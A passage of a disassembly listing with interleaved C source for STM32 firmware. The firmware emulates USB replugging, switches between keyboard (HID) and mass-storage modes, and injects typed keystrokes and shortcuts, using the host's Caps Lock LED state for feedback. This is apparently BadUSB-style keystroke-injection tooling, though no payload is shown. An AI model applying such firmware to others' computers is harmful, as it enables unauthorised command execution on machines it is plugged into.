    Error_Handler();
 800062c:	f000 fb14 	bl	8000c58 <Error_Handler>
  }

  /** Configure LSE Drive Capability
  */
  HAL_PWR_EnableBkUpAccess();
 8000630:	f003 f8aa 	bl	8003788 <HAL_PWR_EnableBkUpAccess>
  __HAL_RCC_LSEDRIVE_CONFIG(RCC_LSEDRIVE_LOW);
 8000634:	4b21      	ldr	r3, [pc, #132]	; (80006bc <SystemClock_Config+0xc0>)
 8000636:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 800063a:	4a20      	ldr	r2, [pc, #128]	; (80006bc <SystemClock_Config+0xc0>)
 800063c:	f023 0318 	bic.w	r3, r3, #24
 8000640:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90

  /** Initializes the RCC Oscillators according to the specified parameters
  * in the RCC_OscInitTypeDef structure.
  */
  RCC_OscInitStruct.OscillatorType = RCC_OSCILLATORTYPE_LSE|RCC_OSCILLATORTYPE_MSI;
 8000644:	2314      	movs	r3, #20
 8000646:	617b      	str	r3, [r7, #20]
  RCC_OscInitStruct.LSEState = RCC_LSE_ON;
 8000648:	2301      	movs	r3, #1
 800064a:	61fb      	str	r3, [r7, #28]
  RCC_OscInitStruct.MSIState = RCC_MSI_ON;
 800064c:	2301      	movs	r3, #1
 800064e:	62fb      	str	r3, [r7, #44]	; 0x2c
  RCC_OscInitStruct.MSICalibrationValue = 0;
 8000650:	2300      	movs	r3, #0
 8000652:	633b      	str	r3, [r7, #48]	; 0x30
  RCC_OscInitStruct.MSIClockRange = RCC_MSIRANGE_6;
 8000654:	2360      	movs	r3, #96	; 0x60
 8000656:	637b      	str	r3, [r7, #52]	; 0x34
  RCC_OscInitStruct.PLL.PLLState = RCC_PLL_ON;
 8000658:	2302      	movs	r3, #2
 800065a:	63fb      	str	r3, [r7, #60]	; 0x3c
  RCC_OscInitStruct.PLL.PLLSource = RCC_PLLSOURCE_MSI;
 800065c:	2301      	movs	r3, #1
 800065e:	643b      	str	r3, [r7, #64]	; 0x40
  RCC_OscInitStruct.PLL.PLLM = 1;
 8000660:	2301      	movs	r3, #1
 8000662:	647b      	str	r3, [r7, #68]	; 0x44
  RCC_OscInitStruct.PLL.PLLN = 24;
 8000664:	2318      	movs	r3, #24
 8000666:	64bb      	str	r3, [r7, #72]	; 0x48
  RCC_OscInitStruct.PLL.PLLP = RCC_PLLP_DIV7;
 8000668:	2307      	movs	r3, #7
 800066a:	64fb      	str	r3, [r7, #76]	; 0x4c
  RCC_OscInitStruct.PLL.PLLQ = RCC_PLLQ_DIV2;
 800066c:	2302      	movs	r3, #2
 800066e:	653b      	str	r3, [r7, #80]	; 0x50
  RCC_OscInitStruct.PLL.PLLR = RCC_PLLR_DIV2;
 8000670:	2302      	movs	r3, #2
 8000672:	657b      	str	r3, [r7, #84]	; 0x54
  if (HAL_RCC_OscConfig(&RCC_OscInitStruct) != HAL_OK)
 8000674:	f107 0314 	add.w	r3, r7, #20
 8000678:	4618      	mov	r0, r3
 800067a:	f003 f909 	bl	8003890 <HAL_RCC_OscConfig>
 800067e:	4603      	mov	r3, r0
 8000680:	2b00      	cmp	r3, #0
 8000682:	d001      	beq.n	8000688 <SystemClock_Config+0x8c>
  {
    Error_Handler();
 8000684:	f000 fae8 	bl	8000c58 <Error_Handler>
  }

  /** Initializes the CPU, AHB and APB buses clocks
  */
  RCC_ClkInitStruct.ClockType = RCC_CLOCKTYPE_HCLK|RCC_CLOCKTYPE_SYSCLK
 8000688:	230f      	movs	r3, #15
 800068a:	603b      	str	r3, [r7, #0]
                              |RCC_CLOCKTYPE_PCLK1|RCC_CLOCKTYPE_PCLK2;
  RCC_ClkInitStruct.SYSCLKSource = RCC_SYSCLKSOURCE_PLLCLK;
 800068c:	2303      	movs	r3, #3
 800068e:	607b      	str	r3, [r7, #4]
  RCC_ClkInitStruct.AHBCLKDivider = RCC_SYSCLK_DIV1;
 8000690:	2300      	movs	r3, #0
 8000692:	60bb      	str	r3, [r7, #8]
  RCC_ClkInitStruct.APB1CLKDivider = RCC_HCLK_DIV1;
 8000694:	2300      	movs	r3, #0
 8000696:	60fb      	str	r3, [r7, #12]
  RCC_ClkInitStruct.APB2CLKDivider = RCC_HCLK_DIV1;
 8000698:	2300      	movs	r3, #0
 800069a:	613b      	str	r3, [r7, #16]

  if (HAL_RCC_ClockConfig(&RCC_ClkInitStruct, FLASH_LATENCY_2) != HAL_OK)
 800069c:	463b      	mov	r3, r7
 800069e:	2102      	movs	r1, #2
 80006a0:	4618      	mov	r0, r3
 80006a2:	f003 fd09 	bl	80040b8 <HAL_RCC_ClockConfig>
 80006a6:	4603      	mov	r3, r0
 80006a8:	2b00      	cmp	r3, #0
 80006aa:	d001      	beq.n	80006b0 <SystemClock_Config+0xb4>
  {
    Error_Handler();
 80006ac:	f000 fad4 	bl	8000c58 <Error_Handler>
  }

  /** Enable MSI Auto calibration
  */
  HAL_RCCEx_EnableMSIPLLMode();
 80006b0:	f004 f91c 	bl	80048ec <HAL_RCCEx_EnableMSIPLLMode>
}
 80006b4:	bf00      	nop
 80006b6:	3758      	adds	r7, #88	; 0x58
 80006b8:	46bd      	mov	sp, r7
 80006ba:	bd80      	pop	{r7, pc}
 80006bc:	40021000 	.word	0x40021000

080006c0 <SimulateUSB_unplug>:

/* USER CODE BEGIN 4 */
void SimulateUSB_unplug(){
 80006c0:	b580      	push	{r7, lr}
 80006c2:	af00      	add	r7, sp, #0
	HAL_GPIO_WritePin(GPIOA, GPIO_PIN_12, GPIO_PIN_RESET);
 80006c4:	2200      	movs	r2, #0
 80006c6:	f44f 5180 	mov.w	r1, #4096	; 0x1000
 80006ca:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 80006ce:	f001 fa7f 	bl	8001bd0 <HAL_GPIO_WritePin>
}
 80006d2:	bf00      	nop
 80006d4:	bd80      	pop	{r7, pc}

080006d6 <SimulateUSB_plugin>:

void SimulateUSB_plugin(){
 80006d6:	b580      	push	{r7, lr}
 80006d8:	af00      	add	r7, sp, #0
	HAL_GPIO_WritePin(GPIOA, GPIO_PIN_12, GPIO_PIN_SET);
 80006da:	2201      	movs	r2, #1
 80006dc:	f44f 5180 	mov.w	r1, #4096	; 0x1000
 80006e0:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 80006e4:	f001 fa74 	bl	8001bd0 <HAL_GPIO_WritePin>
}
 80006e8:	bf00      	nop
 80006ea:	bd80      	pop	{r7, pc}

080006ec <SwitchToHID>:

void SwitchToHID(){
 80006ec:	b580      	push	{r7, lr}
 80006ee:	af00      	add	r7, sp, #0
	SimulateUSB_unplug();
 80006f0:	f7ff ffe6 	bl	80006c0 <SimulateUSB_unplug>
	isMSC = 0;
 80006f4:	4b06      	ldr	r3, [pc, #24]	; (8000710 <SwitchToHID+0x24>)
 80006f6:	2200      	movs	r2, #0
 80006f8:	601a      	str	r2, [r3, #0]
	HAL_Delay(PlugSlot);
 80006fa:	2032      	movs	r0, #50	; 0x32
 80006fc:	f000 fd50 	bl	80011a0 <HAL_Delay>
	SimulateUSB_plugin();
 8000700:	f7ff ffe9 	bl	80006d6 <SimulateUSB_plugin>
	MX_TIM2_Init();
 8000704:	f000 fba2 	bl	8000e4c <MX_TIM2_Init>
	MX_USB_DEVICE_Init();
 8000708:	f00b fe1c 	bl	800c344 <MX_USB_DEVICE_Init>
}
 800070c:	bf00      	nop
 800070e:	bd80      	pop	{r7, pc}
 8000710:	20000978 	.word	0x20000978

08000714 <SwitchToMSC>:

void SwitchToMSC(){
 8000714:	b580      	push	{r7, lr}
 8000716:	af00      	add	r7, sp, #0
	SimulateUSB_unplug();
 8000718:	f7ff ffd2 	bl	80006c0 <SimulateUSB_unplug>
	isMSC = 1;
 800071c:	4b07      	ldr	r3, [pc, #28]	; (800073c <SwitchToMSC+0x28>)
 800071e:	2201      	movs	r2, #1
 8000720:	601a      	str	r2, [r3, #0]
	HAL_Delay(PlugSlot);
 8000722:	2032      	movs	r0, #50	; 0x32
 8000724:	f000 fd3c 	bl	80011a0 <HAL_Delay>
	SimulateUSB_plugin();
 8000728:	f7ff ffd5 	bl	80006d6 <SimulateUSB_plugin>
	MX_USB_DEVICE_Init_MSC();
 800072c:	f00b fe3a 	bl	800c3a4 <MX_USB_DEVICE_Init_MSC>
	HAL_Delay(PlugSlot*10);
 8000730:	f44f 70fa 	mov.w	r0, #500	; 0x1f4
 8000734:	f000 fd34 	bl	80011a0 <HAL_Delay>
}
 8000738:	bf00      	nop
 800073a:	bd80      	pop	{r7, pc}
 800073c:	20000978 	.word	0x20000978

08000740 <Get_Single_Descriptor>:

void Get_Single_Descriptor(uint8_t ascii){
 8000740:	b580      	push	{r7, lr}
 8000742:	b0a4      	sub	sp, #144	; 0x90
 8000744:	af00      	add	r7, sp, #0
 8000746:	4603      	mov	r3, r0
 8000748:	71fb      	strb	r3, [r7, #7]
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 800074a:	220f      	movs	r2, #15
 800074c:	2100      	movs	r1, #0
 800074e:	4821      	ldr	r0, [pc, #132]	; (80007d4 <Get_Single_Descriptor+0x94>)
 8000750:	f00c fc30 	bl	800cfb4 <memset>
	uint8_t Map[MapLen] = Map_Init;
 8000754:	4a20      	ldr	r2, [pc, #128]	; (80007d8 <Get_Single_Descriptor+0x98>)
 8000756:	f107 0308 	add.w	r3, r7, #8
 800075a:	4611      	mov	r1, r2
 800075c:	2285      	movs	r2, #133	; 0x85
 800075e:	4618      	mov	r0, r3
 8000760:	f00c fc54 	bl	800d00c <memcpy>
	Convert2CapsMap(Map);
 8000764:	f107 0308 	add.w	r3, r7, #8
 8000768:	4618      	mov	r0, r3
 800076a:	f000 f93f 	bl	80009ec <Convert2CapsMap>
	uint8_t pos = Map[ascii];
 800076e:	79fb      	ldrb	r3, [r7, #7]
 8000770:	3390      	adds	r3, #144	; 0x90
 8000772:	443b      	add	r3, r7
 8000774:	f813 3c88 	ldrb.w	r3, [r3, #-136]
 8000778:	f887 308f 	strb.w	r3, [r7, #143]	; 0x8f
	sent_buffer[(uint8_t)(pos>>4)] |= (1<<((uint8_t)(pos&0x07)));
 800077c:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 8000780:	091b      	lsrs	r3, r3, #4
 8000782:	b2db      	uxtb	r3, r3
 8000784:	461a      	mov	r2, r3
 8000786:	4b13      	ldr	r3, [pc, #76]	; (80007d4 <Get_Single_Descriptor+0x94>)
 8000788:	5c9b      	ldrb	r3, [r3, r2]
 800078a:	b25a      	sxtb	r2, r3
 800078c:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 8000790:	f003 0307 	and.w	r3, r3, #7
 8000794:	2101      	movs	r1, #1
 8000796:	fa01 f303 	lsl.w	r3, r1, r3
 800079a:	b25b      	sxtb	r3, r3
 800079c:	4313      	orrs	r3, r2
 800079e:	b259      	sxtb	r1, r3
 80007a0:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 80007a4:	091b      	lsrs	r3, r3, #4
 80007a6:	b2db      	uxtb	r3, r3
 80007a8:	461a      	mov	r2, r3
 80007aa:	b2c9      	uxtb	r1, r1
 80007ac:	4b09      	ldr	r3, [pc, #36]	; (80007d4 <Get_Single_Descriptor+0x94>)
 80007ae:	5499      	strb	r1, [r3, r2]
	if((pos&0x08) == 8)
 80007b0:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 80007b4:	f003 0308 	and.w	r3, r3, #8
 80007b8:	2b00      	cmp	r3, #0
 80007ba:	d006      	beq.n	80007ca <Get_Single_Descriptor+0x8a>
		sent_buffer[0] |= 0x02;
 80007bc:	4b05      	ldr	r3, [pc, #20]	; (80007d4 <Get_Single_Descriptor+0x94>)
 80007be:	781b      	ldrb	r3, [r3, #0]
 80007c0:	f043 0302 	orr.w	r3, r3, #2
 80007c4:	b2da      	uxtb	r2, r3
 80007c6:	4b03      	ldr	r3, [pc, #12]	; (80007d4 <Get_Single_Descriptor+0x94>)
 80007c8:	701a      	strb	r2, [r3, #0]
}
 80007ca:	bf00      	nop
 80007cc:	3790      	adds	r7, #144	; 0x90
 80007ce:	46bd      	mov	sp, r7
 80007d0:	bd80      	pop	{r7, pc}
 80007d2:	bf00      	nop
 80007d4:	2000025c 	.word	0x2000025c
 80007d8:	0800d040 	.word	0x0800d040

080007dc <Get_Multi_Descriptor>:

void Get_Multi_Descriptor(uint8_t *array, int num){
 80007dc:	b580      	push	{r7, lr}
 80007de:	b0a6      	sub	sp, #152	; 0x98
 80007e0:	af00      	add	r7, sp, #0
 80007e2:	6078      	str	r0, [r7, #4]
 80007e4:	6039      	str	r1, [r7, #0]
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 80007e6:	220f      	movs	r2, #15
 80007e8:	2100      	movs	r1, #0
 80007ea:	482a      	ldr	r0, [pc, #168]	; (8000894 <Get_Multi_Descriptor+0xb8>)
 80007ec:	f00c fbe2 	bl	800cfb4 <memset>
	uint8_t Map[MapLen] = Map_Init;
 80007f0:	4a29      	ldr	r2, [pc, #164]	; (8000898 <Get_Multi_Descriptor+0xbc>)
 80007f2:	f107 030c 	add.w	r3, r7, #12
 80007f6:	4611      	mov	r1, r2
 80007f8:	2285      	movs	r2, #133	; 0x85
 80007fa:	4618      	mov	r0, r3
 80007fc:	f00c fc06 	bl	800d00c <memcpy>
	Convert2CapsMap(Map);
 8000800:	f107 030c 	add.w	r3, r7, #12
 8000804:	4618      	mov	r0, r3
 8000806:	f000 f8f1 	bl	80009ec <Convert2CapsMap>
	for(int i = 0; i < num; i++){
 800080a:	2300      	movs	r3, #0
 800080c:	f8c7 3094 	str.w	r3, [r7, #148]	; 0x94
 8000810:	e036      	b.n	8000880 <Get_Multi_Descriptor+0xa4>
		uint8_t pos = Map[array[i]];
 8000812:	f8d7 3094 	ldr.w	r3, [r7, #148]	; 0x94
 8000816:	687a      	ldr	r2, [r7, #4]
 8000818:	4413      	add	r3, r2
 800081a:	781b      	ldrb	r3, [r3, #0]
 800081c:	3398      	adds	r3, #152	; 0x98
 800081e:	443b      	add	r3, r7
 8000820:	f813 3c8c 	ldrb.w	r3, [r3, #-140]
 8000824:	f887 3093 	strb.w	r3, [r7, #147]	; 0x93
		sent_buffer[(uint8_t)(pos>>4)] |= (1<<((uint8_t)(pos&0x07)));
 8000828:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 800082c:	091b      	lsrs	r3, r3, #4
 800082e:	b2db      	uxtb	r3, r3
 8000830:	461a      	mov	r2, r3
 8000832:	4b18      	ldr	r3, [pc, #96]	; (8000894 <Get_Multi_Descriptor+0xb8>)
 8000834:	5c9b      	ldrb	r3, [r3, r2]
 8000836:	b25a      	sxtb	r2, r3
 8000838:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 800083c:	f003 0307 	and.w	r3, r3, #7
 8000840:	2101      	movs	r1, #1
 8000842:	fa01 f303 	lsl.w	r3, r1, r3
 8000846:	b25b      	sxtb	r3, r3
 8000848:	4313      	orrs	r3, r2
 800084a:	b259      	sxtb	r1, r3
 800084c:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 8000850:	091b      	lsrs	r3, r3, #4
 8000852:	b2db      	uxtb	r3, r3
 8000854:	461a      	mov	r2, r3
 8000856:	b2c9      	uxtb	r1, r1
 8000858:	4b0e      	ldr	r3, [pc, #56]	; (8000894 <Get_Multi_Descriptor+0xb8>)
 800085a:	5499      	strb	r1, [r3, r2]
		if((pos&0x08) == 8)
 800085c:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 8000860:	f003 0308 	and.w	r3, r3, #8
 8000864:	2b00      	cmp	r3, #0
 8000866:	d006      	beq.n	8000876 <Get_Multi_Descriptor+0x9a>
			sent_buffer[0] |= 0x02;
 8000868:	4b0a      	ldr	r3, [pc, #40]	; (8000894 <Get_Multi_Descriptor+0xb8>)
 800086a:	781b      	ldrb	r3, [r3, #0]
 800086c:	f043 0302 	orr.w	r3, r3, #2
 8000870:	b2da      	uxtb	r2, r3
 8000872:	4b08      	ldr	r3, [pc, #32]	; (8000894 <Get_Multi_Descriptor+0xb8>)
 8000874:	701a      	strb	r2, [r3, #0]
	for(int i = 0; i < num; i++){
 8000876:	f8d7 3094 	ldr.w	r3, [r7, #148]	; 0x94
 800087a:	3301      	adds	r3, #1
 800087c:	f8c7 3094 	str.w	r3, [r7, #148]	; 0x94
 8000880:	f8d7 2094 	ldr.w	r2, [r7, #148]	; 0x94
 8000884:	683b      	ldr	r3, [r7, #0]
 8000886:	429a      	cmp	r2, r3
 8000888:	dbc3      	blt.n	8000812 <Get_Multi_Descriptor+0x36>
	}
}
 800088a:	bf00      	nop
 800088c:	bf00      	nop
 800088e:	3798      	adds	r7, #152	; 0x98
 8000890:	46bd      	mov	sp, r7
 8000892:	bd80      	pop	{r7, pc}
 8000894:	2000025c 	.word	0x2000025c
 8000898:	0800d040 	.word	0x0800d040

0800089c <SimulateKeyPress>:

void SimulateKeyPress(uint8_t ascii){
 800089c:	b580      	push	{r7, lr}
 800089e:	b082      	sub	sp, #8
 80008a0:	af00      	add	r7, sp, #0
 80008a2:	4603      	mov	r3, r0
 80008a4:	71fb      	strb	r3, [r7, #7]
	//get key:ascii Descriptor
	Get_Single_Descriptor(ascii);
 80008a6:	79fb      	ldrb	r3, [r7, #7]
 80008a8:	4618      	mov	r0, r3
 80008aa:	f7ff ff49 	bl	8000740 <Get_Single_Descriptor>
	//Sent Descriptor report
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 80008ae:	220f      	movs	r2, #15
 80008b0:	4903      	ldr	r1, [pc, #12]	; (80008c0 <SimulateKeyPress+0x24>)
 80008b2:	4804      	ldr	r0, [pc, #16]	; (80008c4 <SimulateKeyPress+0x28>)
 80008b4:	f008 f884 	bl	80089c0 <USBD_CUSTOM_HID_SendReport>
}
 80008b8:	bf00      	nop
 80008ba:	3708      	adds	r7, #8
 80008bc:	46bd      	mov	sp, r7
 80008be:	bd80      	pop	{r7, pc}
 80008c0:	2000025c 	.word	0x2000025c
 80008c4:	200003c0 	.word	0x200003c0

080008c8 <SimulateKeyRelease>:

void SimulateKeyRelease(){
 80008c8:	b580      	push	{r7, lr}
 80008ca:	af00      	add	r7, sp, #0
	//set 0
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 80008cc:	220f      	movs	r2, #15
 80008ce:	2100      	movs	r1, #0
 80008d0:	4804      	ldr	r0, [pc, #16]	; (80008e4 <SimulateKeyRelease+0x1c>)
 80008d2:	f00c fb6f 	bl	800cfb4 <memset>
	//Sent Descriptor report
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 80008d6:	220f      	movs	r2, #15
 80008d8:	4902      	ldr	r1, [pc, #8]	; (80008e4 <SimulateKeyRelease+0x1c>)
 80008da:	4803      	ldr	r0, [pc, #12]	; (80008e8 <SimulateKeyRelease+0x20>)
 80008dc:	f008 f870 	bl	80089c0 <USBD_CUSTOM_HID_SendReport>
}
 80008e0:	bf00      	nop
 80008e2:	bd80      	pop	{r7, pc}
 80008e4:	2000025c 	.word	0x2000025c
 80008e8:	200003c0 	.word	0x200003c0

080008ec <SimulateKeyStroke>:

void SimulateKeyStroke(uint8_t ascii){
 80008ec:	b580      	push	{r7, lr}
 80008ee:	b082      	sub	sp, #8
 80008f0:	af00      	add	r7, sp, #0
 80008f2:	4603      	mov	r3, r0
 80008f4:	71fb      	strb	r3, [r7, #7]
	SimulateKeyPress(ascii);
 80008f6:	79fb      	ldrb	r3, [r7, #7]
 80008f8:	4618      	mov	r0, r3
 80008fa:	f7ff ffcf 	bl	800089c <SimulateKeyPress>
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
 80008fe:	2023      	movs	r0, #35	; 0x23
 8000900:	f000 fc4e 	bl	80011a0 <HAL_Delay>
	SimulateKeyRelease();
 8000904:	f7ff ffe0 	bl	80008c8 <SimulateKeyRelease>
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
 8000908:	2023      	movs	r0, #35	; 0x23
 800090a:	f000 fc49 	bl	80011a0 <HAL_Delay>
}
 800090e:	bf00      	nop
 8000910:	3708      	adds	r7, #8
 8000912:	46bd      	mov	sp, r7
 8000914:	bd80      	pop	{r7, pc}
	...

08000918 <SimulateShortcutKey>:

void SimulateShortcutKey(uint8_t *array, int num){
 8000918:	b580      	push	{r7, lr}
 800091a:	b082      	sub	sp, #8
 800091c:	af00      	add	r7, sp, #0
 800091e:	6078      	str	r0, [r7, #4]
 8000920:	6039      	str	r1, [r7, #0]
	Get_Multi_Descriptor(array, num);
 8000922:	6839      	ldr	r1, [r7, #0]
 8000924:	6878      	ldr	r0, [r7, #4]
 8000926:	f7ff ff59 	bl	80007dc <Get_Multi_Descriptor>
	while((recv_buffer[0]&0x02) != 0x02){
 800092a:	e002      	b.n	8000932 <SimulateShortcutKey+0x1a>
		SimulateKeyStroke(128);
 800092c:	2080      	movs	r0, #128	; 0x80
 800092e:	f7ff ffdd 	bl	80008ec <SimulateKeyStroke>
	while((recv_buffer[0]&0x02) != 0x02){
 8000932:	4b0c      	ldr	r3, [pc, #48]	; (8000964 <SimulateShortcutKey+0x4c>)
 8000934:	781b      	ldrb	r3, [r3, #0]
 8000936:	f003 0302 	and.w	r3, r3, #2
 800093a:	2b00      	cmp	r3, #0
 800093c:	d0f6      	beq.n	800092c <SimulateShortcutKey+0x14>
	}
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 800093e:	220f      	movs	r2, #15
 8000940:	4909      	ldr	r1, [pc, #36]	; (8000968 <SimulateShortcutKey+0x50>)
 8000942:	480a      	ldr	r0, [pc, #40]	; (800096c <SimulateShortcutKey+0x54>)
 8000944:	f008 f83c 	bl	80089c0 <USBD_CUSTOM_HID_SendReport>
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
 8000948:	2023      	movs	r0, #35	; 0x23
 800094a:	f000 fc29 	bl	80011a0 <HAL_Delay>
	SimulateKeyRelease();
 800094e:	f7ff ffbb 	bl	80008c8 <SimulateKeyRelease>
	HAL_Delay(ShortcutSlot); //Wait to avoid conflict
 8000952:	f44f 70fa 	mov.w	r0, #500	; 0x1f4
 8000956:	f000 fc23 	bl	80011a0 <HAL_Delay>
}
 800095a:	bf00      	nop
 800095c:	3708      	adds	r7, #8
 800095e:	46bd      	mov	sp, r7
 8000960:	bd80      	pop	{r7, pc}
 8000962:	bf00      	nop
 8000964:	2000026c 	.word	0x2000026c
 8000968:	2000025c 	.word	0x2000025c
 800096c:	200003c0 	.word	0x200003c0

08000970 <SimulateKeyStrokes>:

void SimulateKeyStrokes(char *str, int len, int *cntNow){
 8000970:	b580      	push	{r7, lr}
 8000972:	b084      	sub	sp, #16
 8000974:	af00      	add	r7, sp, #0
 8000976:	60f8      	str	r0, [r7, #12]
 8000978:	60b9      	str	r1, [r7, #8]
 800097a:	607a      	str	r2, [r7, #4]
	for(*cntNow = 0; *cntNow < len; (*cntNow)++){
 800097c:	687b      	ldr	r3, [r7, #4]
 800097e:	2200      	movs	r2, #0
 8000980:	601a      	str	r2, [r3, #0]
 8000982:	e025      	b.n	80009d0 <SimulateKeyStrokes+0x60>
    	//Ensure func SimulateKeyStroke is executed in uppercase environment.
		if((recv_buffer[0]&0x02) != 0x02){
 8000984:	4b17      	ldr	r3, [pc, #92]	; (80009e4 <SimulateKeyStrokes+0x74>)
 8000986:	781b      	ldrb	r3, [r3, #0]
 8000988:	f003 0302 	and.w	r3, r3, #2
 800098c:	2b00      	cmp	r3, #0
 800098e:	d102      	bne.n	8000996 <SimulateKeyStrokes+0x26>
			SimulateKeyStroke(128);
 8000990:	2080      	movs	r0, #128	; 0x80
 8000992:	f7ff ffab 	bl	80008ec <SimulateKeyStroke>
    	}
		SimulateKeyStroke(str[*cntNow]);
 8000996:	687b      	ldr	r3, [r7, #4]
 8000998:	681b      	ldr	r3, [r3, #0]
 800099a:	461a      	mov	r2, r3
 800099c:	68fb      	ldr	r3, [r7, #12]
 800099e:	4413      	add	r3, r2
 80009a0:	781b      	ldrb	r3, [r3, #0]
 80009a2:	4618      	mov	r0, r3
 80009a4:	f7ff ffa2 	bl	80008ec <SimulateKeyStroke>
		//Determine if RollBack is necessary
		if(NeedRollBack == 1){
 80009a8:	4b0f      	ldr	r3, [pc, #60]	; (80009e8 <SimulateKeyStrokes+0x78>)
 80009aa:	681b      	ldr	r3, [r3, #0]
 80009ac:	2b01      	cmp	r3, #1
 80009ae:	d10a      	bne.n	80009c6 <SimulateKeyStrokes+0x56>
			NeedRollBack = 0;
 80009b0:	4b0d      	ldr	r3, [pc, #52]	; (80009e8 <SimulateKeyStrokes+0x78>)
 80009b2:	2200      	movs	r2, #0
 80009b4:	601a      	str	r2, [r3, #0]
			(*cntNow)--;
 80009b6:	687b      	ldr	r3, [r7, #4]
 80009b8:	681b      	ldr	r3, [r3, #0]
 80009ba:	1e5a      	subs	r2, r3, #1
 80009bc:	687b      	ldr	r3, [r7, #4]
 80009be:	601a      	str	r2, [r3, #0]
			SimulateKeyStroke(129);
 80009c0:	2081      	movs	r0, #129	; 0x81
 80009c2:	f7ff ff93 	bl	80008ec <SimulateKeyStroke>
	for(*cntNow = 0; *cntNow < len; (*cntNow)++){
 80009c6:	687b      	ldr	r3, [r7, #4]
 80009c8:	681b      	ldr	r3, [r3, #0]
 80009ca:	1c5a      	adds	r2, r3, #1
 80009cc:	687b      	ldr	r3, [r7, #4]
 80009ce:	601a      	str	r2, [r3, #0]
 80009d0:	687b      	ldr	r3, [r7, #4]
 80009d2:	681b      	ldr	r3, [r3, #0]
 80009d4:	68ba      	ldr	r2, [r7, #8]
 80009d6:	429a      	cmp	r2, r3
 80009d8:	dcd4      	bgt.n	8000984 <SimulateKeyStrokes+0x14>
		}
	}
}
 80009da:	bf00      	nop
 80009dc:	bf00      	nop
 80009de:	3710      	adds	r7, #16
 80009e0:	46bd      	mov	sp, r7
 80009e2:	bd80      	pop	{r7, pc}
 80009e4:	2000026c 	.word	0x2000026c
 80009e8:	2000027c 	.word	0x2000027c

080009ec <Convert2CapsMap>:
		SimulateKeyStroke(128);
		PrintRecvBuf(recv_buffer);  //print Keyboard LED Status
	}
}

void Convert2CapsMap(uint8_t LowerCaseMap[MapLen]){
 80009ec:	b480      	push	{r7}
 80009ee:	b085      	sub	sp, #20
 80009f0:	af00      	add	r7, sp, #0
 80009f2:	6078      	str	r0, [r7, #4]
	for(uint8_t cnt = 'A'; cnt <= 'Z'; cnt++){
 80009f4:	2341      	movs	r3, #65	; 0x41
 80009f6:	73fb      	strb	r3, [r7, #15]
 80009f8:	e01a      	b.n	8000a30 <Convert2CapsMap+0x44>
		LowerCaseMap[cnt] &= 0xf7;
 80009fa:	7bfb      	ldrb	r3, [r7, #15]
 80009fc:	687a      	ldr	r2, [r7, #4]
 80009fe:	4413      	add	r3, r2
 8000a00:	781a      	ldrb	r2, [r3, #0]
 8000a02:	7bfb      	ldrb	r3, [r7, #15]
 8000a04:	6879      	ldr	r1, [r7, #4]
 8000a06:	440b      	add	r3, r1
 8000a08:	f022 0208 	bic.w	r2, r2, #8
 8000a0c:	b2d2      	uxtb	r2, r2
 8000a0e:	701a      	strb	r2, [r3, #0]
		LowerCaseMap[cnt+'a'-'A'] |= 0x08;
 8000a10:	7bfb      	ldrb	r3, [r7, #15]
 8000a12:	3320      	adds	r3, #32
 8000a14:	687a      	ldr	r2, [r7, #4]
 8000a16:	4413      	add	r3, r2
 8000a18:	781a      	ldrb	r2, [r3, #0]
 8000a1a:	7bfb      	ldrb	r3, [r7, #15]
 8000a1c:	3320      	adds	r3, #32
 8000a1e:	6879      	ldr	r1, [r7, #4]
 8000a20:	440b      	add	r3, r1
 8000a22:	f042 0208 	orr.w	r2, r2, #8
 8000a26:	b2d2      	uxtb	r2, r2
 8000a28:	701a      	strb	r2, [r3, #0]
	for(uint8_t cnt = 'A'; cnt <= 'Z'; cnt++){
 8000a2a:	7bfb      	ldrb	r3, [r7, #15]
 8000a2c:	3301      	adds	r3, #1
 8000a2e:	73fb      	strb	r3, [r7, #15]
 8000a30:	7bfb      	ldrb	r3, [r7, #15]
 8000a32:	2b5a      	cmp	r3, #90	; 0x5a
 8000a34:	d9e1      	bls.n	80009fa <Convert2CapsMap+0xe>
	}
}
 8000a36:	bf00      	nop
 8000a38:	bf00      	nop
 8000a3a:	3714      	adds	r7, #20
 8000a3c:	46bd      	mov	sp, r7
 8000a3e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000a42:	4770      	bx	lr

08000a44 <InterruptTrap>:

void InterruptTrap(int *InterruptFlag){
 8000a44:	b580      	push	{r7, lr}
 8000a46:	b082      	sub	sp, #8
 8000a48:	af00      	add	r7, sp, #0
 8000a4a:	6078      	str	r0, [r7, #4]
	if(*InterruptFlag == 1){
 8000a4c:	687b      	ldr	r3, [r7, #4]
 8000a4e:	681b      	ldr	r3, [r3, #0]
 8000a50:	2b01      	cmp	r3, #1
 8000a52:	d10f      	bne.n	8000a74 <InterruptTrap+0x30>
		*InterruptFlag = 0;
 8000a54:	687b      	ldr	r3, [r7, #4]
 8000a56:	2200      	movs	r2, #0
 8000a58:	601a      	str	r2, [r3, #0]
		//Trigger timer interrupt immediately by setting the value of the register
		TIM2->EGR |= TIM_EGR_UG;
